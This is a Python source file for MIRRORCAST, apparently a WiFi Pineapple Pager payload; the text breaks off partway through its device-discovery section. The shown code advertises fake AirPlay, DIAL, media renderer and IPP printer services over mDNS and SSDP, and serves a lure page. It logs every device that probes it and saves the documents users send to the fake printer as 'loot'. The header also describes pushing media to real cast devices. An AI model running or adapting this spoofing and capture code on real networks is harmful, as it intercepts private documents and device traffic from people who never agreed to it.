#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
MIRRORCAST engine for the WiFi Pineapple Pager.

Two modes:
  honeypot  - impersonate AirPlay, DIAL, IPP printer and Chromecast discovery
              endpoints, log every probe, and capture cast/print traffic.
  castjack  - discover real AirPlay / DIAL / DLNA / Chromecast devices on the
              local network and push a media URL to them.

This file is intentionally dependency-light: python3-light is enough for the
discovery/honeypot paths. Chromecast CASTV2 needs the ssl module from
python3-openssl.

Author: MIRRORCAST
License: Use only on networks you are authorized to test.
"""

import argparse
import errno
import fcntl
import http.client
import http.server
import json
import os
import random
import re
import select
import signal
import socket
import socketserver
import struct
import sys
import threading
import time

VERSION = "1.0.0"

MDNS_ADDR = "224.0.0.251"
MDNS_PORT = 5353
SSDP_ADDR = "239.255.255.250"
SSDP_PORT = 1900

DNS_PTR = 12
DNS_TXT = 16
DNS_A = 1
DNS_AAAA = 28
DNS_SRV = 33
DNS_ANY = 255

CASTV2_PORT = 8009
AIRPLAY_PORT = 7000
RAOP_PORT = 5000
IPP_PORT = 631

CONNECTION_NS = "urn:x-cast:com.google.cast.tp.connection"
HEARTBEAT_NS = "urn:x-cast:com.google.cast.tp.heartbeat"
RECEIVER_NS = "urn:x-cast:com.google.cast.receiver"
MEDIA_NS = "urn:x-cast:com.google.cast.media"
DEFAULT_MEDIA_RECEIVER = "CC1AD845"

STOP = threading.Event()


# ---------------------------------------------------------------------------
# small helpers
# ---------------------------------------------------------------------------

def now_iso():
    return time.strftime("%Y-%m-%dT%H:%M:%S%z")


def safe_int(value, default=0):
    try:
        return int(value)
    except Exception:
        return default


def random_hex(n):
    return "".join("%02x" % random.SystemRandom().randrange(256) for _ in range(n))


def make_uuid():
    b = bytearray(os.urandom(16))
    b[6] = (b[6] & 0x0F) | 0x40
    b[8] = (b[8] & 0x3F) | 0x80
    h = b.hex()
    return "%s-%s-%s-%s-%s" % (h[0:8], h[8:12], h[12:16], h[16:20], h[20:32])


def make_mac():
    b = bytearray(os.urandom(6))
    b[0] = (b[0] & 0xFC) | 0x02  # locally administered, unicast
    return ":".join("%02x" % x for x in b)


def get_iface_ip(iface):
    """Return the IPv4 address for an interface, or None."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        req = struct.pack("256s", iface.encode("utf-8")[:15])
        res = fcntl.ioctl(s.fileno(), 0x8915, req)  # SIOCGIFADDR
        return socket.inet_ntoa(res[20:24])
    except OSError:
        return None
    finally:
        s.close()


def get_iface_mac(iface):
    """Return the MAC address for an interface, or None."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        req = struct.pack("256s", iface.encode("utf-8")[:15])
        res = fcntl.ioctl(s.fileno(), 0x8927, req)  # SIOCGIFHWADDR
        return ":".join("%02x" % x for x in res[18:24])
    except OSError:
        return None
    finally:
        s.close()


def iface_list():
    out = []
    for idx, name in socket.if_nameindex():
        ip = get_iface_ip(name)
        if ip and not ip.startswith("127."):
            out.append((name, ip))
    return out


def interface_ip(iface):
    ip = get_iface_ip(iface)
    if not ip:
        raise SystemExit("Interface %s has no IPv4 address" % iface)
    return ip


def http_date():
    return time.strftime("%a, %d %b %Y %H:%M:%S GMT", time.gmtime())


def parse_url(url):
    """Return (scheme, host, port, path) for a simple http(s) URL."""
    if url.startswith("https://"):
        scheme, rest = "https", url[8:]
    elif url.startswith("http://"):
        scheme, rest = "http", url[7:]
    else:
        scheme, rest = "http", url
    if "/" in rest:
        hostport, path = rest.split("/", 1)
        path = "/" + path
    else:
        hostport, path = rest, "/"
    if ":" in hostport:
        host, port_s = hostport.rsplit(":", 1)
        port = safe_int(port_s, 443 if scheme == "https" else 80)
    else:
        host, port = hostport, (443 if scheme == "https" else 80)
    return scheme, host, port, path or "/"


def http_request(url, method="GET", body=None, headers=None, timeout=6):
    scheme, host, port, path = parse_url(url)
    if scheme == "https":
        import ssl
        ctx = ssl._create_unverified_context()
        conn = http.client.HTTPSConnection(host, port, timeout=timeout, context=ctx)
    else:
        conn = http.client.HTTPConnection(host, port, timeout=timeout)
    try:
        conn.request(method, path, body=body, headers=headers or {})
        resp = conn.getresponse()
        data = resp.read(1024 * 1024)
        hdrs = {k.lower(): v for k, v in resp.getheaders()}
        return resp.status, hdrs, data
    finally:
        conn.close()


def decode_text(data, limit=4096):
    if not data:
        return ""
    return data[:limit].decode("utf-8", "replace")


def json_lines(path):
    out = []
    try:
        with open(path, "r", encoding="utf-8", errors="replace") as f:
            for line in f:
                try:
                    out.append(json.loads(line))
                except Exception:
                    pass
    except OSError:
        pass
    return out


# ---------------------------------------------------------------------------
# loot / UI
# ---------------------------------------------------------------------------

class Loot(object):
    def __init__(self, path, quiet=False):
        self.path = path
        self.quiet = quiet
        self.print_dir = os.path.join(path, "printjobs")
        os.makedirs(self.print_dir, exist_ok=True)
        self.events_path = os.path.join(path, "events.jsonl")
        self.ui_path = os.path.join(path, "ui.log")
        self._lock = threading.Lock()
        self._print_seq = 0

    def print_paths(self, src):
        """Return (raw, doc) paths with a process-unique name."""
        with self._lock:
            self._print_seq += 1
            seq = self._print_seq
        stamp = time.strftime("%Y%m%d_%H%M%S")
        base = "%s_%03d_%s" % (stamp, seq, src.replace(":", "-"))
        return (os.path.join(self.print_dir, base + ".ipp"),
                os.path.join(self.print_dir, base + ".doc"))

    def event(self, kind, **data):
        rec = {"ts": now_iso(), "kind": kind}
        rec.update(data)
        line = json.dumps(rec, ensure_ascii=False)
        with self._lock:
            try:
                with open(self.events_path, "a", encoding="utf-8") as f:
                    f.write(line + "\n")
            except OSError:
                pass

    def ui(self, msg):
        line = "[%s] %s" % (time.strftime("%H:%M:%S"), msg)
        with self._lock:
            try:
                with open(self.ui_path, "a", encoding="utf-8") as f:
                    f.write(line + "\n")
            except OSError:
                pass
        if not self.quiet:
            print(line, flush=True)

    def save_print(self, src, body, headers):
        raw_path, doc_path = self.print_paths(src)
        with open(raw_path, "wb") as f:
            f.write(body)
        # The document follows the IPP end-of-attributes tag (0x03).
        idx = body.find(b"\x03")
        doc = body[idx + 1:] if idx >= 0 else body
        if doc:
            with open(doc_path, "wb") as f:
                f.write(doc)
        self.event("printjob", src=src, bytes=len(body), raw=raw_path,
                   doc=doc_path if doc else "", headers=headers)
        self.ui("PRINT JOB from %s (%d bytes)" % (src, len(body)))
        return raw_path


# ---------------------------------------------------------------------------
# DNS / mDNS
# ---------------------------------------------------------------------------

def enc_name(name):
    out = bytearray()
    for label in name.rstrip(".").split("."):
        if not label:
            continue
        b = label.encode("utf-8", "replace")
        if len(b) > 63:
            b = b[:63]
        out.append(len(b))
        out += b
    out.append(0)
    return bytes(out)


def dec_name(data, off):
    labels = []
    jumped = False
    orig = off
    seen = set()
    while off < len(data):
        ln = data[off]
        if ln == 0:
            off += 1
            if not jumped:
                orig = off
            break
        if (ln & 0xC0) == 0xC0:
            ptr = ((ln & 0x3F) << 8) | data[off + 1]
            if not jumped:
                orig = off + 2
            jumped = True
            if ptr in seen:
                break
            seen.add(ptr)
            off = ptr
            continue
        labels.append(data[off + 1:off + 1 + ln].decode("utf-8", "replace"))
        off += 1 + ln
        if not jumped:
            orig = off
    return ".".join(labels), (orig if jumped else off)


def build_dns(questions, answers, flags=0x0000, qid=0):
    out = bytearray(struct.pack(">HHHHHH", qid, flags,
                                len(questions), len(answers), 0, 0))
    for q in questions:
        out += enc_name(q["name"])
        out += struct.pack(">HH", q.get("type", DNS_ANY), q.get("class", 1))
    for rr in answers:
        out += enc_name(rr["name"])
        out += struct.pack(">HHI", rr["type"], rr.get("class", 1), rr.get("ttl", 120))
        rdata = rr["rdata"]
        out += struct.pack(">H", len(rdata)) + rdata
    return bytes(out)


def parse_dns(data):
    if len(data) < 12:
        return None
    qid, flags, qd, an, ns, ar = struct.unpack(">HHHHHH", data[:12])
    off = 12
    questions = []
    answers = []
    for _ in range(qd):
        name, off = dec_name(data, off)
        if off + 4 > len(data):
            return None
        qtype, qclass = struct.unpack(">HH", data[off:off + 4])
        off += 4
        questions.append({"name": name, "type": qtype, "class": qclass})
    total = an + ns + ar
    for _ in range(total):
        name, off = dec_name(data, off)
        if off + 10 > len(data):
            break
        rtype, rclass, ttl, rdlen = struct.unpack(">HHIH", data[off:off + 10])
        off += 10
        rdata_off = off
        rdata = data[off:off + rdlen]
        off += rdlen
        answers.append({"name": name, "type": rtype, "class": rclass,
                        "ttl": ttl, "rdata": rdata, "rdata_off": rdata_off,
                        "raw": data})
    return {"id": qid, "flags": flags, "questions": questions,
            "answers": answers, "raw": data}


def rr_name(rr):
    """Decode a PTR/SRV name, following compression pointers in the packet."""
    raw = rr.get("raw")
    if raw is not None and "rdata_off" in rr:
        name, _ = dec_name(raw, rr["rdata_off"])
        return name
    name, _ = dec_name(rr["rdata"], 0)
    return name


def parse_txt(rdata):
    out = []
    i = 0
    while i < len(rdata):
        ln = rdata[i]
        i += 1
        out.append(rdata[i:i + ln].decode("utf-8", "replace"))
        i += ln
    return out


def parse_srv(rdata, message=None, offset=0):
    if len(rdata) < 6:
        return None
    pri, weight, port = struct.unpack(">HHH", rdata[:6])
    if message is not None:
        target, _ = dec_name(message, offset + 6)
    else:
        target, _ = dec_name(rdata, 6)
    return {"priority": pri, "weight": weight, "port": port, "target": target}


def bind_to_device(sock, iface):
    """Keep multicast listeners scoped to the selected radio when possible."""
    if not iface:
        return
    try:
        # SO_BINDTODEVICE is 25 on Linux. Requires root, which the payload has.
        sock.setsockopt(socket.SOL_SOCKET, 25, iface.encode("utf-8") + b"\x00")
    except OSError:
        pass
    try:
        # Do not deliver multicast joined on other interfaces (Linux 4.5+).
        sock.setsockopt(socket.IPPROTO_IP,
                        getattr(socket, "IP_MULTICAST_ALL", 49), 0)
    except OSError:
        pass


def mdns_socket(ip, iface=None):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
    except OSError:
        pass
    bind_to_device(sock, iface)
    bound = False
    try:
        sock.bind(("", MDNS_PORT))
        bound = True
    except OSError:
        sock.bind(("", 0))
    try:
        mreq = struct.pack("4s4s", socket.inet_aton(MDNS_ADDR),
                           socket.inet_aton(ip))
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
    except OSError:
        pass
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_IF, socket.inet_aton(ip))
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 255)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_LOOP, 0)
    sock.settimeout(0.5)
    return sock, bound


def mdns_send(sock, packet):
    try:
        sock.sendto(packet, (MDNS_ADDR, MDNS_PORT))
    except OSError:
        pass


# ---------------------------------------------------------------------------
# mDNS service advertisement
# ---------------------------------------------------------------------------

def build_mdns_records(ip, host, services):
    records = []
    seen = set()

    def add(name, rtype, rclass, ttl, rdata):
        key = (name, rtype, rdata)
        if key in seen:
            return
        seen.add(key)
        records.append({"name": name, "type": rtype, "class": rclass,
                        "ttl": ttl, "rdata": rdata})

    for svc in services:
        add(svc["type"], DNS_PTR, 1, 120, enc_name(svc["instance"]))
        add("_services._dns-sd._udp.local", DNS_PTR, 1, 120, enc_name(svc["type"]))
        srv = struct.pack(">HHH", 0, 0, svc["port"]) + enc_name(svc["host"])
        add(svc["instance"], DNS_SRV, 0x8001, 120, srv)
        txt = b"".join(bytes([len(t)]) + t.encode("utf-8") for t in svc.get("txt", []))
        add(svc["instance"], DNS_TXT, 0x8001, 120, txt)
        add(svc["host"], DNS_A, 0x8001, 120, socket.inet_aton(ip))
    return records


def mdns_responder(ip, host, services, loot, iface=None):
    try:
        sock, bound = mdns_socket(ip, iface)
    except OSError as exc:
        loot.ui("mDNS disabled: %s" % exc)
        return
    records = build_mdns_records(ip, host, services)
    names = set(r["name"] for r in records)
    announcement = build_dns([], records, flags=0x8400)
    mdns_send(sock, announcement)
    last_announce = time.time()
    seen_src = set()
    loot.ui("mDNS advertising %d records on %s" % (len(records), ip))
    while not STOP.is_set():
        try:
            data, addr = sock.recvfrom(9000)
        except socket.timeout:
            data = None
        except OSError:
            break
        if data:
            pkt = parse_dns(data)
            if pkt and (pkt["flags"] & 0x8000) == 0:
                qnames = [q["name"] for q in pkt["questions"]]
                loot.event("mdns_query", src=addr[0], questions=qnames)
                if addr[0] not in seen_src:
                    seen_src.add(addr[0])
                    loot.ui("mDNS probe from %s: %s" % (addr[0], ", ".join(qnames)[:90]))
                if any(q in names or q == "_services._dns-sd._udp.local" for q in qnames):
                    resp = build_dns(pkt["questions"], records, flags=0x8400)
                    mdns_send(sock, resp)
                    # Some clients ask for a unicast reply (QU bit).
                    try:
                        sock.sendto(resp, addr)
                    except OSError:
                        pass
        if time.time() - last_announce > 60:
            mdns_send(sock, announcement)
            last_announce = time.time()
    sock.close()


# ---------------------------------------------------------------------------
# SSDP
# ---------------------------------------------------------------------------

SSDP_TARGETS = [
    "upnp:rootdevice",
    "urn:dial-multiscreen-org:service:dial:1",
    "urn:schemas-upnp-org:device:MediaRenderer:1",
    "urn:schemas-upnp-org:device:Printer:1",
]


def parse_http_headers(data):
    text = data.decode("utf-8", "replace")
    lines = text.replace("\r\n", "\n").split("\n")
    first = lines[0].strip() if lines else ""
    headers = {}
    for line in lines[1:]:
        if ":" in line:
            k, v = line.split(":", 1)
            headers[k.strip().lower()] = v.strip()
    return first, headers


def device_path_for_st(st):
    low = st.lower()
    if "printer" in low:
        return "/printer.xml"
    if "mediarenderer" in low:
        return "/renderer.xml"
    return "/description.xml"


def ssdp_response(ip, port, uuid, st):
    usn = ("uuid:%s" % uuid) if st.startswith("uuid:") else ("uuid:%s::%s" % (uuid, st))
    return (
        "HTTP/1.1 200 OK\r\n"
        "CACHE-CONTROL: max-age=1800\r\n"
        "DATE: %s\r\n"
        "EXT:\r\n"
        "LOCATION: http://%s:%d%s\r\n"
        "SERVER: Linux/1.0 UPnP/1.1 MirrorCast/%s\r\n"
        "ST: %s\r\n"
        "USN: %s\r\n"
        "BOOTID.UPNP.ORG: 1\r\n"
        "CONFIGID.UPNP.ORG: 1\r\n"
        "\r\n" % (http_date(), ip, port, device_path_for_st(st), VERSION, st, usn)
    ).encode("utf-8")


def ssdp_notify(ip, port, uuid):
    msgs = []
    for st in SSDP_TARGETS:
        usn = ("uuid:%s" % uuid) if st.startswith("uuid:") else ("uuid:%s::%s" % (uuid, st))
        msgs.append((
            "NOTIFY * HTTP/1.1\r\n"
            "HOST: %s:%d\r\n"
            "CACHE-CONTROL: max-age=1800\r\n"
            "LOCATION: http://%s:%d%s\r\n"
            "NT: %s\r\n"
            "NTS: ssdp:alive\r\n"
            "SERVER: Linux/1.0 UPnP/1.1 MirrorCast/%s\r\n"
            "USN: %s\r\n"
            "BOOTID.UPNP.ORG: 1\r\n"
            "CONFIGID.UPNP.ORG: 1\r\n"
            "\r\n" % (SSDP_ADDR, SSDP_PORT, ip, port, device_path_for_st(st),
                      st, VERSION, usn)
        ).encode("utf-8"))
    return msgs


def ssdp_responder(ip, port, uuid, loot, iface=None):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
    except OSError:
        pass
    bind_to_device(sock, iface)
    try:
        sock.bind(("", SSDP_PORT))
    except OSError as exc:
        loot.ui("SSDP disabled: %s" % exc)
        return
    try:
        mreq = struct.pack("4s4s", socket.inet_aton(SSDP_ADDR),
                           socket.inet_aton(ip))
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
    except OSError:
        pass
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_IF, socket.inet_aton(ip))
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2)
    sock.settimeout(0.7)
    notifies = ssdp_notify(ip, port, uuid)
    for msg in notifies:
        try:
            sock.sendto(msg, (SSDP_ADDR, SSDP_PORT))
        except OSError:
            pass
    last_notify = time.time()
    seen_src = set()
    loot.ui("SSDP advertising DIAL / MediaRenderer / Printer on %s" % ip)
    while not STOP.is_set():
        try:
            data, addr = sock.recvfrom(9000)
        except socket.timeout:
            data = None
        except OSError:
            break
        if data:
            first, headers = parse_http_headers(data)
            if first.upper().startswith("M-SEARCH"):
                st = headers.get("st", "")
                ua = headers.get("user-agent", "")
                loot.event("ssdp_search", src=addr[0], st=st, ua=ua)
                if addr[0] not in seen_src:
                    seen_src.add(addr[0])
                    loot.ui("SSDP search from %s: %s" % (addr[0], st[:80]))
                targets = []
                if st in ("ssdp:all", "upnp:rootdevice"):
                    targets = SSDP_TARGETS + ["uuid:%s" % uuid]
                elif st in SSDP_TARGETS or st == "uuid:%s" % uuid:
                    targets = [st]
                for target in targets:
                    try:
                        sock.sendto(ssdp_response(ip, port, uuid, target), addr)
                    except OSError:
                        pass
        if time.time() - last_notify > 60:
            for msg in notifies:
                try:
                    sock.sendto(msg, (SSDP_ADDR, SSDP_PORT))
                except OSError:
                    pass
            last_notify = time.time()
    sock.close()


# ---------------------------------------------------------------------------
# HTTP device descriptions and honeypot endpoints
# ---------------------------------------------------------------------------

def description_xml(ip, port, uuid, name):
    base = "http://%s:%d" % (ip, port)
    return """<?xml version="1.0" encoding="utf-8"?>
<root xmlns="urn:schemas-upnp-org:device-1-0">
  <specVersion><major>1</major><minor>0</minor></specVersion>
  <device>
    <deviceType>urn:schemas-upnp-org:device:MediaRenderer:1</deviceType>
    <friendlyName>%s</friendlyName>
    <manufacturer>MirrorCast</manufacturer>
    <manufacturerURL>http://example.com/</manufacturerURL>
    <modelDescription>MirrorCast media endpoint</modelDescription>
    <modelName>MirrorCast</modelName>
    <modelNumber>1.0</modelNumber>
    <serialNumber>%s</serialNumber>
    <UDN>uuid:%s</UDN>
    <serviceList>
      <service>
        <serviceType>urn:dial-multiscreen-org:service:dial:1</serviceType>
        <serviceId>urn:dial-multiscreen-org:serviceId:dial</serviceId>
        <controlURL>/apps</controlURL>
        <eventSubURL>/events</eventSubURL>
        <SCPDURL>/dial.xml</SCPDURL>
      </service>
      <service>
        <serviceType>urn:schemas-upnp-org:service:AVTransport:1</serviceType>
        <serviceId>urn:upnp-org:serviceId:AVTransport</serviceId>
        <controlURL>/upnp/control/avtransport</controlURL>
        <eventSubURL>/upnp/event/avtransport</eventSubURL>
        <SCPDURL>/avtransport.xml</SCPDURL>
      </service>
    </serviceList>
    <dial xmlns="urn:dial-multiscreen-org:schemas:dial">
      <Application-URL>%s/apps</Application-URL>
    </dial>
  </device>
</root>
""" % (name, uuid, uuid, base)


def printer_description_xml(ip, port, uuid, name):
    """Device description served at /printer.xml for Printer:1 SSDP replies."""
    base = "http://%s:%d" % (ip, port)
    return """<?xml version="1.0" encoding="utf-8"?>
<root xmlns="urn:schemas-upnp-org:device-1-0">
  <specVersion><major>1</major><minor>0</minor></specVersion>
  <device>
    <deviceType>urn:schemas-upnp-org:device:Printer:1</deviceType>
    <friendlyName>%s</friendlyName>
    <manufacturer>MirrorCast</manufacturer>
    <manufacturerURL>http://example.com/</manufacturerURL>
    <modelDescription>MirrorCast print endpoint</modelDescription>
    <modelName>MirrorCast Printer</modelName>
    <modelNumber>1.0</modelNumber>
    <serialNumber>%s</serialNumber>
    <UDN>uuid:%s</UDN>
    <serviceList>
      <service>
        <serviceType>urn:schemas-upnp-org:service:PrintBasic:1</serviceType>
        <serviceId>urn:upnp-org:serviceId:PrintBasic</serviceId>
        <controlURL>/upnp/control/printbasic</controlURL>
        <eventSubURL>/upnp/event/printbasic</eventSubURL>
        <SCPDURL>/printbasic.xml</SCPDURL>
      </service>
    </serviceList>
    <printer xmlns="urn:schemas-upnp-org:device-1-0">
      <PrinterURL>%s/ipp/print</PrinterURL>
    </printer>
  </device>
</root>
""" % (name, uuid, uuid, base)


def scpd_xml(service):
    return """<?xml version="1.0" encoding="utf-8"?>
<scpd xmlns="urn:schemas-upnp-org:service-1-0">
  <specVersion><major>1</major><minor>0</minor></specVersion>
  <actionList>
    <action><name>%s</name></action>
  </actionList>
  <serviceStateTable/>
</scpd>
""" % service


LURE_HTML = """<!doctype html>
<html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Device Ready</title>
<style>
body{margin:0;background:#0b1020;color:#e8edf7;font-family:-apple-system,Segoe UI,Roboto,sans-serif;
display:flex;min-height:100vh;align-items:center;justify-content:center}
.card{max-width:420px;padding:32px;border-radius:18px;background:#151c33;
box-shadow:0 20px 60px rgba(0,0,0,.5);text-align:center}
.dot{width:54px;height:54px;border-radius:50%;margin:0 auto 18px;
background:radial-gradient(circle at 35% 35%,#7ef0ff,#2563eb);box-shadow:0 0 40px #2563eb}
h1{font-size:22px;margin:0 0 8px}p{color:#9aa8c7;line-height:1.5}
.bar{height:6px;background:#0b1020;border-radius:99px;overflow:hidden;margin:22px 0 8px}
.bar i{display:block;height:100%;width:38%;background:linear-gradient(90deg,#2563eb,#7ef0ff);
animation:go 1.8s ease-in-out infinite}
@keyframes go{0%{margin-left:-40%}100%{margin-left:100%}}
small{color:#5e6b89}
</style></head><body><div class="card">
<div class="dot"></div><h1>Device Ready</h1>
<p>This display is available to receive content.</p>
<div class="bar"><i></i></div>
<small>MIRRORCAST &middot; authorized testing only</small>
</div></body></html>
"""


class MirrorCastHandler(http.server.BaseHTTPRequestHandler):
    server_version = "MirrorCast/" + VERSION
    sys_version = ""
    protocol_version = "HTTP/1.1"

    loot = None
    iface_ip = "127.0.0.1"
    http_port = 8080
    device_uuid = ""
    device_name = "MirrorCast"
    lure_html = LURE_HTML

    def log_message(self, fmt, *args):
        return

    # -- helpers ---------------------------------------------------------
    def _headers_dict(self):
        return {k.lower(): v for k, v in self.headers.items()}

    def _body_size(self):
        return safe_int(self.headers.get("Content-Length", "0"), 0)

    def _read_body(self, limit=1024 * 1024):
        if "chunked" in (self.headers.get("Transfer-Encoding", "").lower()):
            chunks = []
            total = 0
            while True:
                line = self.rfile.readline(4096).strip()
                if not line:
                    break
                try:
                    size = int(line.split(b";", 1)[0], 16)
                except ValueError:
                    break
                if size == 0:
                    self.rfile.readline(4096)
                    break
                chunk = self.rfile.read(size)
                self.rfile.read(2)
                chunks.append(chunk)
                total += len(chunk)
                if total >= limit:
                    break
            return b"".join(chunks)[:limit]
        length = self._body_size()
        if length <= 0:
            return b""
        return self.rfile.read(min(length, limit))

    def _stream_body_to_files(self, raw_path, doc_path, limit=64 * 1024 * 1024):
        """Stream an IPP body to disk and split out the document after 0x03."""
        length = self._body_size()
        written = 0
        doc_written = 0
        eoat = False
        with open(raw_path, "wb") as raw, open(doc_path, "wb") as doc:
            if length <= 0:
                return 0, 0
            remaining = min(length, limit)
            while remaining > 0:
                chunk = self.rfile.read(min(65536, remaining))
                if not chunk:
                    break
                raw.write(chunk)
                written += len(chunk)
                remaining -= len(chunk)
                if eoat:
                    doc.write(chunk)
                    doc_written += len(chunk)
                else:
                    idx = chunk.find(b"\x03")
                    if idx >= 0:
                        tail = chunk[idx + 1:]
                        if tail:
                            doc.write(tail)
                            doc_written += len(tail)
                        eoat = True
        return written, doc_written

    def _send(self, code, body=b"", ctype="text/html; charset=utf-8", extra=None):
        if isinstance(body, str):
            body = body.encode("utf-8")
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        if extra:
            for k, v in extra.items():
                self.send_header(k, v)
        self.end_headers()
        try:
            self.wfile.write(body)
        except (BrokenPipeError, ConnectionResetError):
            pass

    def _log_http(self, body=b""):
        hdrs = self._headers_dict()
        rec = {
            "src": self.client_address[0],
            "method": self.command,
            "path": self.path,
            "headers": hdrs,
            "body": decode_text(body),
        }
        self.loot.event("http", **rec)
        self.loot.ui("%s %s from %s%s" % (
            self.command, self.path[:70], self.client_address[0],
            (" [%s]" % hdrs.get("user-agent", "")[:40]) if hdrs.get("user-agent") else ""))
        if body:
            self.loot.ui("  body: %s" % decode_text(body, 220).replace("\n", " "))

    def _is_ipp(self):
        ctype = self.headers.get("Content-Type", "").lower()
        path = self.path.split("?", 1)[0].lower()
        if "application/ipp" in ctype:
            return True
        if path == "/ipp" or path.startswith("/ipp/"):
            return True
        if path == "/printers" or path.startswith("/printers/"):
            return True
        return "printjob" in path

    # -- GET -------------------------------------------------------------
    def do_GET(self):
        path = self.path.split("?", 1)[0]
        if path in ("/description.xml", "/dd.xml", "/rootDesc.xml",
                    "/ssdp/device-desc.xml", "/setup.xml", "/renderer.xml"):
            self.loot.event("http", src=self.client_address[0], method="GET",
                            path=self.path, headers=self._headers_dict())
            xml = description_xml(self.iface_ip, self.http_port,
                                  self.device_uuid, self.device_name)
            self._send(200, xml, "text/xml; charset=utf-8")
            return
        if path == "/printer.xml":
            self.loot.event("http", src=self.client_address[0], method="GET",
                            path=self.path, headers=self._headers_dict())
            listen_port = self.server.server_address[1]
            xml = printer_description_xml(self.iface_ip, listen_port,
                                          self.device_uuid, self.device_name)
            self._send(200, xml, "text/xml; charset=utf-8")
            return
        if path in ("/dial.xml",):
            self._send(200, scpd_xml("GetAppStatus"), "text/xml; charset=utf-8")
            return
        if path in ("/avtransport.xml",):
            self._send(200, scpd_xml("SetAVTransportURI"), "text/xml; charset=utf-8")
            return
        if path in ("/printbasic.xml",):
            self._send(200, scpd_xml("GetPrinterAttributes"), "text/xml; charset=utf-8")
            return
        if path in ("/", "/index.html"):
            self._log_http()
            self._send(200, self.lure_html)
            return
        if path.startswith("/apps"):
            self._log_http()
            app = path[len("/apps"):].strip("/") or "app"
            self._send(200, "<app><name>%s</name><state>stopped</state></app>" % app,
                       "text/xml; charset=utf-8")
            return
        self._log_http()
        self._send(404, "not found", "text/plain; charset=utf-8")

    # -- POST / PUT ------------------------------------------------------
    def do_POST(self):
        self._handle_write()

    def do_PUT(self):
        self._handle_write()

    def do_OPTIONS(self):
        self._send(200, b"", "text/plain", {"Public": "OPTIONS, GET, POST, PUT"})

    def _handle_write(self):
        path = self.path.split("?", 1)[0]
        if self._is_ipp():
            raw_path, doc_path = self.loot.print_paths(self.client_address[0])
            written, doc_written = self._stream_body_to_files(raw_path, doc_path)
            if not doc_written:
                try:
                    os.unlink(doc_path)
                except OSError:
                    pass
                doc_path = ""
            try:
                with open(raw_path, "rb") as f:
                    head = f.read(4096)
            except OSError:
                head = b""
            reqid = head[4:8] if len(head) >= 8 else b"\x00\x00\x00\x00"
            self.loot.event("printjob", src=self.client_address[0],
                            path=self.path, bytes=written, doc=doc_path,
                            headers=self._headers_dict(), raw=raw_path)
            self.loot.ui("PRINT JOB from %s (%d bytes)" % (self.client_address[0], written))
            # Minimal successful IPP response: version 2.0, status 0, request-id.
            self._send(200, b"\x02\x00\x00\x00" + reqid, "application/ipp")
            return

        body = self._read_body()
        self._log_http(body)
        if path.startswith("/upnp/control/"):
            soap = ("""<?xml version="1.0"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"
 s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<s:Body><u:SetAVTransportURIResponse xmlns:u="urn:schemas-upnp-org:service:AVTransport:1">
</u:SetAVTransportURIResponse></s:Body></s:Envelope>""")
            self._send(200, soap, "text/xml; charset=utf-8",
                       {"EXT": ""})
            return
        if path.startswith("/apps"):
            self._send(201, "", "text/plain")
            return
        self._send(200, "OK", "text/plain; charset=utf-8")


class ThreadingHTTPServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
    daemon_threads = True
    allow_reuse_address = True


def start_http_server(port, loot, ip, uuid, name, lure_html, http_port):
    # Bind to the selected interface address so the honeypot stays in scope.

    handler = type("Handler", (MirrorCastHandler,), {
        "loot": loot,
        "iface_ip": ip,
        "http_port": http_port,
        "device_uuid": uuid,
        "device_name": name,
        "lure_html": lure_html,
    })
    try:
        server = ThreadingHTTPServer((ip, port), handler)
    except OSError as exc:
        loot.ui("HTTP port %d unavailable: %s" % (port, exc))
        return None
    t = threading.Thread(target=server.serve_forever, daemon=True)
    t.start()
    loot.ui("HTTP service on %s:%d" % (ip, port))
    return server


# ---------------------------------------------------------------------------
# raw TCP logger (RAOP / Chromecast lure)
# ---------------------------------------------------------------------------

def tcp_logger(ip, port, label, loot):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        sock.bind((ip, port))
        sock.listen(16)
    except OSError as exc:
        loot.ui("%s port %d unavailable: %s" % (label, port, exc))
        return
    sock.settimeout(0.7)
    loot.ui("%s listener on %s:%d" % (label, ip, port))
    while not STOP.is_set():
        try:
            conn, addr = sock.accept()
        except socket.timeout:
            continue
        except OSError:
            break
        try:
            conn.settimeout(1.5)
            data = conn.recv(2048)
            loot.event("tcp", src=addr[0], port=port, label=label,
                       data=decode_text(data, 512))
            loot.ui("TCP %s connect from %s (%d bytes)" % (label, addr[0], len(data)))
        except OSError:
            pass
        finally:
            try:
                conn.close()
            except OSError:
                pass
    sock.close()


# ---------------------------------------------------------------------------
# discovery / scan
# ---------------------------------------------------------------------------

SCAN_TYPES = [
    "_googlecast._tcp.local",
    "_airplay._tcp.local",
    "_raop._tcp.local",
    "_dial._tcp.local",
    "_ipp._tcp.local",
    "_ipps._tcp.local",
    "_printer._tcp.local",
    "_http._tcp.local",
]


def classify_service(service_type):
    s = service_type.lower()
    if "googlecast" in s:
        return "chromecast"
